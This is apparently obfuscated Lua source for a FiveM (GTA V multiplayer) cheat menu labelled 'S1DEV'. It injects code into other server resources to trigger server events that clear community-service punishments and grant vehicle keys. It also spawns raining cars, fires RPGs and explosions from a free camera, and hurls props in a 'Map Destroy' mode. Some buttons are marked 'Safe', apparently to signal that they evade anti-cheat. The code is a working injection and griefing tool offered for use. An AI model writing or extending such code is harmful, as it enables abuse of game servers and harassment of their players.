v66={"prop_loopile_06","dt1_05_build1_damage","hei_dt1_tcmodzito","sum_prop_dufocore_01a","sr_prop_stunt_tube_xs_02a","xs_propint2_set_scifi_10","prop_crate_02a","xs_prop_arena_turret_01a_wl","xs_prop_arena_podium_02a","prop_air_bigradar","xs_prop_arena_barrel_01a_sf","prop_church_01","prop_cs_crane_arm","xs_prop_arena_turntable_01a_wl","prop_cstl_twr_b","prop_skid_tent_01","xs_prop_hamburgher_wl","prop_container_01a","prop_contnr_pile_01a","stt_prop_stunt_track_start","stt_prop_stunt_track_dwuturn","xs_prop_arena_podium_02a","prop_rock_1_b","xs_prop_arena_barrel_01a_sf","prop_rock_4_b","stt_prop_stunt_tube_fn_05","csx_seabedrock3","hei_prop_carrier_jet","prop_windmill_01","dt1_02_build1_damage","p_oil_pjack_01_amo","stt_prop_stunt_tube_l","xs_terrain_dyst_ground_07","prop_tyre_9","prop_tree_01","prop_tree_02","stt_prop_stunt_tube_fn_02"};local v67=952 -(783 + 168) ;function RotationToDirection(v231) local v232=math.rad(v231.z);local v233=math.rad(v231.x);local v234=math.cos(v233);return vector3( -math.sin(v232) * v234 ,math.cos(v232) * v234 ,math.sin(v233));end function ToggleFreeCam() local v235=0 -0 ;while true do if (v235==0) then v54= not v54;if v54 then local v775=0 + 0 ;local v776;local v777;while true do if (v775==(312 -(309 + 2))) then v55=CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA",v776.x,v776.y,v776.z,v777.x,v777.y,v777.z,153 -103 );SetCamActive(v55,true);v775=1214 -(1090 + 122) ;end if (v775==(1 + 1)) then RenderScriptCams(true,false,671 -471 ,false,false);SetEntityVisible(PlayerPedId(),false,false);v775=3 + 0 ;end if ((1118 -(628 + 490))==v775) then v776=GetGameplayCamCoord();v777=GetGameplayCamRot();v775=1;end if (v775==(1 + 2)) then FreezeEntityPosition(PlayerPedId(),true);break;end end else local v778=0;while true do if (v778==3) then EnableAllControlActions(0 -0 );EnableAllControlActions(4 -3 );break;end if (2==v778) then NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);v778=777 -(431 + 343) ;end if ((1 -0)==v778) then SetEntityVisible(PlayerPedId(),true,false);FreezeEntityPosition(PlayerPedId(),false);v778=5 -3 ;end if (v778==(0 + 0)) then if v55 then local v936=0;while true do if (v936==(0 + 0)) then SetCamActive(v55,false);RenderScriptCams(false,true,0,false,false);v936=1696 -(556 + 1139) ;end if (v936==(16 -(6 + 9))) then DestroyCam(v55);v55=nil;break;end end end SetFocusEntity(PlayerPedId());v778=1;end end end break;end end end function CloseFreeCam() if (v54 and v55) then v54=false;SetCamActive(v55,false);RenderScriptCams(false,true,0 + 0 ,false,false);DestroyCam(v55);v55=nil;SetFocusEntity(PlayerPedId());SetEntityVisible(PlayerPedId(),true,false);FreezeEntityPosition(PlayerPedId(),false);NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);EnableAllControlActions(0 + 0 );EnableAllControlActions(170 -(28 + 141) );end end function draw_center_dot() local v236=0 + 0 ;local v237;local v238;while true do if (v236==(0 -0)) then v237,v238=GetActiveScreenResolution();DrawRect(0.5,0.5 + 0 ,(1319 -(486 + 831))/v237 ,2/v238 ,663 -408 ,255,255,897 -642 );break;end end end function draw_freecam_circle() local v239=80;local v240=0.6 + 0 ;local v241=0.5 -0 ;local v242=1263.5 -(668 + 595) ;local v243=((2 + 0) * math.pi)/v239 ;local v244=v241 + v240 ;local v245=v242;for v481=1 + 0 ,v239 do local v482=v481 * v243 ;local v483=v241 + (v240 * math.cos(v482)) ;local v484=v242 + (v240 * math.sin(v482)) ;DrawLine(v244,v245,0 -0 ,v483,v484,290 -(23 + 267) ,2199 -(1129 + 815) ,642 -(371 + 16) ,2005 -(1326 + 424) ,340 -160 );v244=v483;v245=v484;end end local function v68(v246,v247,v248) local v249=0 -0 ;local v250;local v251;while true do if (v249==2) then if HasModelLoaded(v250) then local v779=0;local v780;local v781;while true do if (v779==1) then SetModelAsNoLongerNeeded(v250);if DoesEntityExist(v781) then local v937=0;while true do if (v937==(118 -(88 + 30))) then SetEntityVelocity(v781,v247.x * (831 -(720 + 51)) ,v247.y * 60 ,math.random(10,66 -36 ));SetEntityAsMissionEntity(v781,true,true);v937=1;end if (v937==(1777 -(421 + 1355))) then return v781;end end end break;end if (v779==(0 -0)) then v780=v246 + (v247 * 15) ;v781=CreateVehicle(v250,v780.x,v780.y,v780.z + 5 ,math.random(0 + 0 ,1443 -(286 + 797) ),true,false);v779=3 -2 ;end end end return nil;end if (v249==(1 -0)) then v251=0;while  not HasModelLoaded(v250) and (v251<(489 -(397 + 42)))  do Wait(10);v251=v251 + 1 + 0 ;end v249=802 -(24 + 776) ;end if (v249==(0 -0)) then v250=GetHashKey(v248);RequestModel(v250);v249=1;end end end local function v69(v252,v253) local v254=0;local v255;local v256;while true do if (v254==(787 -(222 + 563))) then if HasModelLoaded(v255) then local v782=math.random() * (3 -1) * math.pi ;local v783=math.random(4 + 1 ,215 -(23 + 167) );local v784=v252.x + (math.cos(v782) * v783) ;local v785=v252.y + (math.sin(v782) * v783) ;local v786=v252.z + math.random(1798 -(690 + 1108) ,15) ;local v787=CreateObject(v255,v784,v785,v786,true,true,true);if DoesEntityExist(v787) then local v894=0 + 0 ;while true do if (v894==(1 + 0)) then SetEntityVelocity(v787,math.random( -(858 -(40 + 808)),10),math.random( -(2 + 8),10),math.random(15,50));SetModelAsNoLongerNeeded(v255);v894=7 -5 ;end if (v894==2) then return v787;end if (v894==(0 + 0)) then SetEntityAsMissionEntity(v787,true,true);SetEntityCollision(v787,true,true);v894=1 + 0 ;end end end SetModelAsNoLongerNeeded(v255);end return nil;end if (0==v254) then v255=GetHashKey(v253);RequestModel(v255);v254=1 + 0 ;end if (v254==1) then v256=0;while  not HasModelLoaded(v255) and (v256<(621 -(47 + 524)))  do local v753=0 + 0 ;while true do if (v753==(0 -0)) then Wait(14 -4 );v256=v256 + (2 -1) ;break;end end end v254=1728 -(1165 + 561) ;end end end Citizen.CreateThread(function() while true do Citizen.Wait(0 + 0 );if IsControlJustPressed(0 -0 ,29 + 45 ) then if v56 then local v788=479 -(341 + 138) ;while true do if (v788==(1 + 0)) then EnableAllControlActions(0 -0 );EnableAllControlActions(1);v788=328 -(89 + 237) ;end if (v788==0) then NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);v788=1;end if (v788==(6 -4)) then ToggleFreeCam();break;end end end end if ( not v56 and v54) then CloseFreeCam();end if (v54 and v55) then local v687=GetCamCoord(v55);local v688=GetCamRot(v55);local v689=RotationToDirection(v688);local v690=IsControlPressed(0,21);local v691=(v690 and (10 -5)) or (881.5 -(581 + 300)) ;if IsControlPressed(1220 -(855 + 365) ,32) then v687=v687 + (v689 * v691) ;elseif IsControlPressed(0 -0 ,33) then v687=v687-(v689 * v691) ;end if IsControlPressed(0,12 + 22 ) then v687=v687 + (vector3( -v689.y,v689.x,1235 -(1030 + 205) ) * v691) ;elseif IsControlPressed(0,33 + 2 ) then v687=v687 + (vector3(v689.y, -v689.x,0 + 0 ) * v691) ;end SetCamCoord(v55,v687.x,v687.y,v687.z);local v692=GetControlNormal(286 -(156 + 130) ,2 -1 ) * 4 ;local v693=GetControlNormal(0,2 -0 ) * (7 -3) ;if ((v692~=0) or (v693~=(0 + 0))) then SetCamRot(v55,v688.x-v693 ,v688.y,v688.z-v692 );end TaskStandStill(PlayerPedId(),6 + 4 );SetFocusPosAndVel(v687.x,v687.y,v687.z,0,69 -(10 + 59) ,0 + 0 );local v694=StartExpensiveSynchronousShapeTestLosProbe(v687.x,v687.y,v687.z,v687.x + (v689.x * (2462 -1962)) ,v687.y + (v689.y * (1663 -(671 + 492))) ,v687.z + (v689.z * (399 + 101)) , -1,PlayerPedId());local v695,v696,v697,v695,v698=GetShapeTestResult(v694);if IsControlJustPressed(1215 -(369 + 846) ,12 + 32 ) then v59=v59-(1 + 0) ;if (v59<(1946 -(1036 + 909))) then v59= #v58;end PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if IsControlJustPressed(0 -0 ,38) then local v789=203 -(11 + 192) ;while true do if (v789==(0 + 0)) then v59=v59 + (176 -(135 + 40)) ;if (v59> #v58) then v59=2 -1 ;end v789=1 + 0 ;end if (v789==(2 -1)) then PlaySoundFrontend( -(1 -0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end local v699=v58[v59];if (v699=="Shoot Car") then local v790=0;while true do if (v790==(176 -(50 + 126))) then if (IsControlJustPressed(0,484 -310 ) or IsControlJustPressed(0 + 0 ,241)) then v63=v63-(1414 -(1233 + 180)) ;if (v63<(970 -(522 + 447))) then v63= #v60;end PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if (IsControlJustPressed(1421 -(107 + 1314) ,175) or IsControlJustPressed(0,242)) then v63=v63 + 1 + 0 ;if (v63> #v60) then v63=2 -1 ;end PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end break;end end elseif (v699=="Shoot Boat") then if (IsControlJustPressed(0 + 0 ,174) or IsControlJustPressed(0 -0 ,953 -712 )) then v64=v64-(1911 -(716 + 1194)) ;if (v64<(1 + 0)) then v64= #v61;end PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if (IsControlJustPressed(0 + 0 ,678 -(74 + 429) ) or IsControlJustPressed(0 -0 ,242)) then v64=v64 + 1 + 0 ;if (v64> #v61) then v64=2 -1 ;end PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end elseif (v699=="Shoot Plane") then local v929=0;while true do if (v929==(0 -0)) then if (IsControlJustPressed(0,174) or IsControlJustPressed(0,595 -354 )) then v65=v65-(434 -(279 + 154)) ;if (v65<(779 -(454 + 324))) then v65= #v62;end PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if (IsControlJustPressed(0,175) or IsControlJustPressed(0,242)) then local v962=17 -(12 + 5) ;while true do if (v962==1) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v962==0) then v65=v65 + 1 ;if (v65> #v62) then v65=2 -1 ;end v962=1 + 0 ;end end end break;end end elseif (v699=="Map Destroy") then local v945=1093 -(277 + 816) ;while true do if (0==v945) then if (IsControlJustPressed(0 -0 ,1357 -(1058 + 125) ) or IsControlJustPressed(0,46 + 195 )) then v67=v67-(976 -(815 + 160)) ;if (v67<(4 -3)) then v67= #v66;end PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if (IsControlJustPressed(0 -0 ,42 + 133 ) or IsControlJustPressed(0,242)) then local v966=0 -0 ;while true do if (v966==(1898 -(41 + 1857))) then v67=v67 + (1894 -(1222 + 671)) ;if (v67> #v66) then v67=2 -1 ;end v966=1 -0 ;end if (v966==(1183 -(229 + 953))) then PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end break;end end end SetTextFont(1778 -(1111 + 663) );SetTextProportional(1580 -(874 + 705) );SetTextScale(0,0.425 + 0 );SetTextColour(0 + 0 ,530 -275 ,8 + 247 ,934 -(642 + 37) );SetTextOutline();SetTextCentre(true);SetTextEntry("STRING");local v700="["   .. v58[v59]   .. "]" ;if (v699=="Shoot Car") then v700="[Shoot Car: "   .. v60[v63]   .. "]" ;elseif (v699=="Shoot Boat") then v700="[Shoot Boat: "   .. v61[v64]   .. "]" ;elseif (v699=="Shoot Plane") then v700="[Shoot Plane: "   .. v62[v65]   .. "]" ;elseif (v699=="Map Destroy") then v700="[Map Destroy: "   .. v66[v67]   .. "]" ;end AddTextComponentString(v700);DrawText(0.5 + 0 ,0.93);draw_center_dot();draw_freecam_circle();if IsDisabledControlJustPressed(0 + 0 ,59 -35 ) then if (v699=="Select") then if (v696 and v698 and (v698~=0)) then local v930=454 -(233 + 221) ;local v931;local v932;while true do if (v930==(2 -1)) then MachoMenuNotification("Freecam","Selected: "   .. v932 );break;end if (v930==(0 + 0)) then v931=GetEntityType(v698);v932=((v931==(1542 -(718 + 823))) and "Ped") or ((v931==(2 + 0)) and "Vehicle") or ((v931==(808 -(266 + 539))) and "Object") or "Unknown" ;v930=1;end end end elseif (v699=="Teleportation") then if v696 then v57=v697;end if (v57~=nil) then local v946=PlayerPedId();local v947=GetVehiclePedIsIn(v946,false);local v948=v57;if (v947 and (v947~=(0 -0))) then SetEntityCoords(v947,v948.x,v948.y,v948.z + 2 ,false,false,false,false);else SetEntityCoords(v946,v948.x,v948.y,v948.z + (1226 -(636 + 589)) ,false,false,false,false);end v57=nil;MachoMenuNotification("Freecam","Teleported!");end elseif (v699=="RPG") then if v696 then local v960=GetHashKey("WEAPON_RPG");RequestWeaponAsset(v960,73 -42 ,0);while  not HasWeaponAssetLoaded(v960) do Wait(0);end ShootSingleBulletBetweenCoords(v687.x,v687.y,v687.z,v697.x,v697.y,v697.z,206 -106 ,true,v960,PlayerPedId(),true,false,793 + 207 );MachoMenuNotification("Freecam","RPG Fired!");end elseif (v699=="Explosion") then if v696 then local v965=0 + 0 ;while true do if (v965==0) then AddExplosion(v697.x,v697.y,v697.z,1022 -(657 + 358) ,132 -82 ,true,false,2 -1 );MachoMenuNotification("Freecam","Explosion!");break;end end end elseif (v699=="Shoot Car") then if v696 then local v967=1187 -(1151 + 36) ;local v968;while true do if ((0 + 0)==v967) then v968=v68(v687,v689,v60[v63]);if v968 then MachoMenuNotification("Freecam","Car spawned: "   .. v60[v63] );end break;end end end elseif (v699=="Shoot Boat") then if v696 then local v969=v68(v687,v689,v61[v64]);if v969 then MachoMenuNotification("Freecam","Boat spawned: "   .. v61[v64] );end end elseif (v699=="Shoot Plane") then if v696 then local v970=v68(v687,v689,v62[v65]);if v970 then MachoMenuNotification("Freecam","Plane spawned: "   .. v62[v65] );end end elseif (v699=="Map Destroy") then if v696 then local v971=0 + 0 ;local v972;while true do if (v971==(0 -0)) then v972=v69(v697,v66[v67]);if v972 then MachoMenuNotification("Freecam","Spawned: "   .. v66[v67] );end break;end end end end end end end end);MachoMenuCheckbox(v9,"S1DEV Freecam - Safe",function() local v257=0;while true do if (v257==(1832 -(1552 + 280))) then v56=true;if  not v54 then ToggleFreeCam();end break;end end end,function() local v258=834 -(64 + 770) ;while true do if ((0 + 0)==v258) then v56=false;CloseFreeCam();break;end end end);MachoMenuButton(v9,"Close Menu",function() local v259=0;while true do if (v259==(0 -0)) then v5=0 + 0 ;MachoMenuDestroy(v4);break;end end end);MachoMenuButton(v9,"Animation Cancel On/Off",function() animCancel= not animCancel;if animCancel then print("Animation cancel ACTIVE - X key");else print("Animation cancel OFF");end end);CreateThread(function() while true do local v485=1243 -(157 + 1086) ;while true do if (v485==(0 -0)) then Wait(0 -0 );if (animCancel and IsControlJustPressed(0,111 -38 )) then ClearPedTasksImmediately(PlayerPedId());end break;end end end end);MachoMenuButton(v9,"Armor - Safe",function() local v260=PlayerPedId();SetPedArmour(v260,136 -36 );MachoMenuNotification("S1DEV","Armor applied.");end);MachoMenuButton(v9,"Clear Community Service (Safe)",function() local v261=0;while true do if (0==v261) then MachoInjectResource("any",[[
        TriggerServerEvent('qb-communityservice:finishCommunityService', -1)
    ]]);MachoMenuNotification("[Safe Process]","Community service clear command applied.");break;end end end);MachoMenuButton(v9,"Random Skin - Safe",function() local v262=819 -(599 + 220) ;local v263;while true do if (v262==(0 -0)) then v263=PlayerPedId();SetPedRandomComponentVariation(v263,false);v262=1932 -(1813 + 118) ;end if (v262==(1 + 0)) then SetPedRandomProps(v263);MachoMenuNotification("S1DEV","Random skin applied.");break;end end end);local v70=MachoMenuAddTab(v4,"Vehicle Menu");local v71=MachoMenuGroup(v70,"Vehicle Creation",v3,1226 -(841 + 376) ,(v1.x-v3) + (210 -60) ,v1.y);MachoMenuText(v71,"Enter Vehicle Model (e.g., sultan)");local v72=MachoMenuInputbox(v71,"Vehicle Model","e.g., sultan");local v73=false;MachoMenuCheckbox(v71,"Get Vehicle Key?",function() v73=true;end,function() v73=false;end);MachoMenuButton(v71,"Create Vehicle",function() local v264=MachoMenuGetInputbox(v72);if (v264 and (v264~="")) then local v521=0;while true do if (v521==(0 + 0)) then MachoInjectResource("monitor",string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)
            local giveKey = %s

            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Invalid model: %s' } })
                return
            end

            RequestModel(modelHash)
            while not HasModelLoaded(modelHash) do
                Wait(0)
            end

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)

            if vehicle and vehicle ~= 0 then
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                TaskWarpPedIntoVehicle(ped, vehicle, -1)

                if giveKey then
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerEvent("vehiclekeys:client:SetOwner", plate)
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created and key given!' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created! (No key)' } })
                end
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Failed to create vehicle!' } })
            end

            SetModelAsNoLongerNeeded(modelHash)
        ]],v264,tostring(v73),v264));if v73 then MachoMenuNotification("Vehicle System","Vehicle created and key given!");else MachoMenuNotification("Vehicle System","Vehicle created (No key given)!");end break;end end else MachoMenuNotification("Error","Please enter a valid vehicle model!");end end);MachoMenuButton(v71,"Fix Vehicle",function() local v265=GetVehiclePedIsIn(GetPlayerPed( -(2 -1)),false);if (v265 and (v265~=(859 -(464 + 395)))) then SetVehicleFixed(v265);SetVehicleDeformationFixed(v265);SetVehicleUndriveable(v265,false);MachoMenuNotification("Vehicle repaired.",2500);else MachoMenuNotification("You are not in a vehicle.",6415 -3915 );end end);MachoMenuButton(v71,"Fix Engine",function() local v266=GetVehiclePedIsIn(GetPlayerPed( -(1 + 0)),false);if (v266 and (v266~=(837 -(467 + 370)))) then SetVehicleEngineHealth(v266,2066 -1066 );Citizen.InvokeNative(2292506500000000000 -(841 + 966) ,v266,0 -0 );else MachoMenuNotification("You are not in a vehicle.",5816 -3316 );end end);MachoMenuButton(v71,"Flip Vehicle",function() local v267=GetPlayerPed( -(521 -(150 + 370)));local v268=GetVehiclePedIsIn(v267,true);if (IsPedInAnyVehicle(v267,false) and (GetPedInVehicleSeat(v268, -(1283 -(74 + 1208)))==v267)) then SetVehicleOnGroundProperly(v268);MachoMenuNotification("Vehicle flipped.",6149 -3649 );else MachoMenuNotification("You are not in the driver's seat.",2500);end end);MachoMenuButton(v71,"Max Tuning",function() local v269=GetVehiclePedIsUsing(PlayerPedId( -(4 -3)));if (v269 and (v269~=0)) then local v522=0 + 0 ;while true do if (v522==(391 -(14 + 376))) then SetVehicleWindowTint(v269,1 -0 );SetVehicleTyresCanBurst(v269,false);v522=2 + 0 ;end if (v522==(0 + 0)) then SetVehicleModKit(v269,0);for v850=0 + 0 ,49 do local v851=GetNumVehicleMods(v269,v850) -1 ;if (v851>=0) then SetVehicleMod(v269,v850,v851,false);end end v522=2 -1 ;end if (v522==2) then MachoMenuNotification("Vehicle max tuned!",1881 + 619 );break;end end else MachoMenuNotification("You are not in a vehicle!",2578 -(23 + 55) );end end);MachoMenuButton(v71,"TP to Nearest Vehicle",function() local v270=GetPlayerPed( -1);local v271=GetEntityCoords(v270,true);local v272=GetClosestVehicle(v271,2369 -1369 ,0 + 0 ,4);local v273=GetEntityCoords(v272,true);local v274=GetClosestVehicle(v271,898 + 102 ,0 -0 ,5154 + 11230 );local v275=GetEntityCoords(v274,true);MachoMenuNotification("~y~Waiting...",1901 -(652 + 249) );Citizen.Wait(2676 -1676 );if ((v272==(1868 -(708 + 1160))) and (v274==(0 -0))) then MachoMenuNotification("~b~No vehicle found",4558 -2058 );elseif ((v272==0) and (v274~=(27 -(10 + 17)))) then local v754=0 + 0 ;while true do if (v754==(1732 -(1400 + 332))) then if IsVehicleSeatFree(v274, -1) then local v933=0;while true do if (v933==(1 -0)) then SetVehicleDoorsLocked(v274,1);SetVehicleNeedsToBeHotwired(v274,false);break;end if (v933==(1908 -(242 + 1666))) then SetPedIntoVehicle(v270,v274, -(1 + 0));SetVehicleAlarm(v274,false);v933=1 + 0 ;end end else local v934=0 + 0 ;local v935;while true do if ((942 -(850 + 90))==v934) then SetPedIntoVehicle(v270,v274, -1);SetVehicleAlarm(v274,false);v934=4 -1 ;end if (v934==1) then SetEntityAsMissionEntity(v935,1391 -(360 + 1030) ,1);DeleteEntity(v935);v934=2 + 0 ;end if ((7 -4)==v934) then SetVehicleDoorsLocked(v274,1);SetVehicleNeedsToBeHotwired(v274,false);break;end if (v934==0) then v935=GetPedInVehicleSeat(v274, -(1 -0));ClearPedTasksImmediately(v935);v934=1662 -(909 + 752) ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",3723 -(109 + 1114) );break;end end elseif ((v272~=(0 -0)) and (v274==(0 + 0))) then local v852=242 -(6 + 236) ;while true do if (v852==(0 + 0)) then if IsVehicleSeatFree(v272, -1) then local v949=0;while true do if (v949==(1 + 0)) then SetVehicleDoorsLocked(v272,2 -1 );SetVehicleNeedsToBeHotwired(v272,false);break;end if (v949==(0 -0)) then SetPedIntoVehicle(v270,v272, -1);SetVehicleAlarm(v272,false);v949=1;end end else local v950=1133 -(1076 + 57) ;local v951;while true do if (v950==(1 + 1)) then SetPedIntoVehicle(v270,v272, -1);SetVehicleAlarm(v272,false);v950=692 -(579 + 110) ;end if (v950==(1 + 2)) then SetVehicleDoorsLocked(v272,1 + 0 );SetVehicleNeedsToBeHotwired(v272,false);break;end if (v950==(0 + 0)) then v951=GetPedInVehicleSeat(v272, -1);ClearPedTasksImmediately(v951);v950=408 -(174 + 233) ;end if (v950==(2 -1)) then SetEntityAsMissionEntity(v951,1 -0 ,1 + 0 );DeleteEntity(v951);v950=1176 -(663 + 511) ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",2231 + 269 );break;end end else local v853= #(v271-v273);local v854= #(v271-v275);if (v853<v854) then if IsVehicleSeatFree(v272, -1) then SetPedIntoVehicle(v270,v272, -1);SetVehicleAlarm(v272,false);SetVehicleDoorsLocked(v272,1);SetVehicleNeedsToBeHotwired(v272,false);else local v938=0 + 0 ;local v939;while true do if (v938==(9 -6)) then SetVehicleDoorsLocked(v272,1 + 0 );SetVehicleNeedsToBeHotwired(v272,false);break;end if (v938==(4 -2)) then SetPedIntoVehicle(v270,v272, -(2 -1));SetVehicleAlarm(v272,false);v938=2 + 1 ;end if (v938==(1 -0)) then SetEntityAsMissionEntity(v939,1 + 0 ,1);DeleteEntity(v939);v938=2;end if (v938==(0 + 0)) then v939=GetPedInVehicleSeat(v272, -(723 -(478 + 244)));ClearPedTasksImmediately(v939);v938=1;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",2500);else local v909=0;while true do if (v909==0) then if IsVehicleSeatFree(v274, -1) then SetPedIntoVehicle(v270,v274, -(518 -(440 + 77)));SetVehicleAlarm(v274,false);SetVehicleDoorsLocked(v274,1);SetVehicleNeedsToBeHotwired(v274,false);else local v961=GetPedInVehicleSeat(v274, -1);ClearPedTasksImmediately(v961);SetEntityAsMissionEntity(v961,1 + 0 ,3 -2 );DeleteEntity(v961);SetPedIntoVehicle(v270,v274, -1);SetVehicleAlarm(v274,false);SetVehicleDoorsLocked(v274,1557 -(655 + 901) );SetVehicleNeedsToBeHotwired(v274,false);end MachoMenuNotification("~g~Teleported to nearest vehicle!",464 + 2036 );break;end end end end end);MachoMenuText(v71,"RainCar Spawn");local v74=MachoMenuInputbox(v71,"Vehicle Model","Enter vehicle name");MachoMenuButton(v71,"Start Vehicle Rain",function() local v276=0;local v277;while true do if (v276==0) then v277=MachoMenuGetInputbox(v74);if ((v277==nil) or (v277=="")) then MachoMenuNotification("Error","Please enter a valid vehicle model!");return;end v276=1 + 0 ;end if (v276==(1 + 0)) then MachoInjectResource("monitor",string.format([[
        if careverActive then
            print("Carever is already running.")
            return
        end

        local vehicleModel = "%s"
        careverActive = true

        Citizen.CreateThread(function()
            while careverActive do
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                
                RequestModel(GetHashKey(vehicleModel))
                while not HasModelLoaded(GetHashKey(vehicleModel)) do
                    Citizen.Wait(100)
                end
                
                local randomX = playerCoords.x + math.random(-50, 50)
                local randomY = playerCoords.y + math.random(-50, 50)
                local randomZ = playerCoords.z + 100
                
                local vehicle = CreateVehicle(GetHashKey(vehicleModel), randomX, randomY, randomZ, 0.0, true, true)
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleEngineOn(vehicle, true, true, true)
                
                Citizen.Wait(math.random(1000, 3000))
            end
        end)
    ]],v277));MachoMenuNotification("RainCar","Vehicle rain started!");break;end end end);MachoMenuButton(v71,"Stop Vehicle Rain",function() MachoInjectResource("monitor",[[
        careverActive = false
    ]]);MachoMenuNotification("RainCar","Vehicle rain stopped!");end);MachoMenuButton(v71,"Helicopter Spawn",function() local v278=PlayerPedId();local v279=GetEntityCoords(v278);MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local heliModel = "buzzard2"
        
        RequestModel(GetHashKey(heliModel))
        while not HasModelLoaded(GetHashKey(heliModel)) do
            Citizen.Wait(50)
        end
        
        local helicopter = CreateVehicle(GetHashKey(heliModel), playerCoords.x, playerCoords.y, playerCoords.z + 5.0, 0.0, true, true)
        SetEntityAsMissionEntity(helicopter, true, true)
        SetVehicleDoorsLocked(helicopter, 1)
        SetVehicleEngineOn(helicopter, true, true, true)
        
        SetModelAsNoLongerNeeded(GetHashKey(heliModel))
    ]]);MachoMenuNotification("Helicopter","Helicopter spawned!");end);local v75=false;MachoMenuCheckbox(v71,"Speedboost SHIFT CTRL",function() MachoInjectResource("monitor",[[
        speedboostActive = true
        CreateThread(function()
            while speedboostActive do
                if IsPedInAnyVehicle(PlayerPedId(), true) then
                    if IsControlPressed(0, 209) then -- LEFT SHIFT
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 100.0)
                    elseif IsControlPressed(0, 210) then -- LEFT CTRL
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
                    end
                end
                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("monitor",[[
        speedboostActive = false
    ]]);end);local v76=false;MachoMenuCheckbox(v71,"Vehicle God Mode",function() v76=true;MachoInjectResource("monitor",[[
        VehGod = true
        CreateThread(function()
            while VehGod do
                local playerPed = PlayerPedId()
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsUsing(playerPed)
                    SetEntityInvincible(vehicle, true)
                end
                Wait(0)
            end
        end)
    ]]);end,function() v76=false;MachoInjectResource("monitor",[[
        VehGod = false
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsUsing(playerPed)
            SetEntityInvincible(vehicle, false)
        end
    ]]);end);local v77=false;local v78=nil;MachoMenuCheckbox(v71,"Waterproof Vehicle",function(v280) local v281=0 -0 ;while true do if (v281==(1445 -(695 + 750))) then v77=v280;if v77 then if (v78==nil) then v78=Citizen.CreateThread(function() local v910=0;while true do if (v910==(0 -0)) then while v77 do local v957=PlayerPedId();if IsPedInAnyVehicle(v957,false) then local v963=0 -0 ;local v964;while true do if (v963==(0 -0)) then v964=GetVehiclePedIsUsing(v957);SetVehicleEngineOn(v964,true,true,true);v963=352 -(285 + 66) ;end if (v963==(2 -1)) then SetEntityProofs(v964,false,false,true,false,false,false,false,false);break;end end end Citizen.Wait(0);end v78=nil;break;end end end);end else local v791=1310 -(682 + 628) ;local v792;while true do if (v791==1) then v77=false;break;end if (v791==(0 + 0)) then v792=PlayerPedId();if IsPedInAnyVehicle(v792,false) then local v940=0;local v941;while true do if (v940==(299 -(176 + 123))) then v941=GetVehiclePedIsUsing(v792);SetEntityProofs(v941,false,false,false,false,false,false,false,false);break;end end end v791=1;end end end break;end end end);MachoMenuButton(v71,"Spawn Car with Keys",function() local v282=nil;if (GetResourceState("monitor")=="started") then v282="monitor";elseif (GetResourceState("qb-core")=="started") then v282="qb-core";else v282="ox_inventory";end MachoInjectResource2(NewThreadNs,v282,[[
        -- Spawn a random car with keys
        local carModels = {
            "sultan", "adder", "zentorno", "t20", "nero", 
            "fmj", "insurgent", "kuruma2", "elegy2", "banshee",
            "comet2", "jester", "massacro", "entityxf", "osiris",
            "reaper", "turismor", "pfister811", "italigtb", "vagner"
        }
        
        local modelName = carModels[math.random(1, #carModels)]
        local modelHash = GetHashKey(modelName)
        
        RequestModel(modelHash)
        local timeout = 0
        while not HasModelLoaded(modelHash) and timeout < 100 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end
        
        if HasModelLoaded(modelHash) then
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, heading, true, false)
            
